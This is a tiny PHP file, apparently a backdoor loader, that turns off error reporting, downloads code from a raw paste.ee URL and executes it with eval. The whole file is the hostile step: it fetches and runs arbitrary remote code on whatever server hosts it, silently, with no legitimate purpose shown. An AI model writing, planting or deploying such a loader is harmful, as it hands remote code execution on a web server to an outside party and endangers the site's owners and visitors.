<?php
error_reporting(0);
$url = 'https://paste.ee/r/m48HoPM1';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
